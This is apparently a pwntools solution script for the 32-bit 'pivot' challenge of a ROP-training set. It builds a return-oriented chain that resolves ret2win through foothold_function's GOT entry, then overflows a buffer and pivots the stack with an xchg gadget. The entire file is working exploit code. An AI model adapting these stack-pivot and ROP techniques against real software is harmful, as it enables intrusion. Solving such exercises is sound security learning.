from pwn import *

exe = ELF("./pivot32", checksec=False)
p = process(exe.path)
libpivot = ELF("./libpivot32.so", checksec=False) 

p.recvuntil(b"pivot: ")
pivot = int(p.recvline().strip(), 16)
print(f"Pivot address: {hex(pivot)}")

# gadgets
pop_ebx = 0x080484a9      #0x080484a9: pop ebx; ret; 
pop_eax = 0x0804882c      #0x0804882c: pop eax; ret; 
call_eax = 0x080485f0     #0x080485f0: call eax; 
load_eax = 0x08048830     #0x08048830: mov eax, dword ptr [eax]; ret;
add_eax_ebx = 0x08048833  #0x08048833: add eax, ebx; ret; 
xchg_eax_esp = 0x0804882e #0x0804882e: xchg esp, eax; ret; 

offset = libpivot.symbols['ret2win'] - libpivot.symbols['foothold_function']
print(f"Offset: {hex(offset)}")

payload = p32(exe.plt["foothold_function"])
payload += p32(pop_eax)
payload += p32(exe.got["foothold_function"])    #rax = &foothold_function
payload += p32(load_eax)    #eax = [eax]
payload += p32(pop_ebx)
payload += p32(offset) 
payload += p32(add_eax_ebx)
payload += p32(call_eax)

p.sendlineafter(b"> ", payload)

pivoting_payload = b'A' * 44
pivoting_payload += p32(pop_eax)
pivoting_payload += p32(pivot)
pivoting_payload += p32(xchg_eax_esp)

p.sendlineafter(b"> ", pivoting_payload)

output = p.recvall().decode(errors="ignore")
print(output)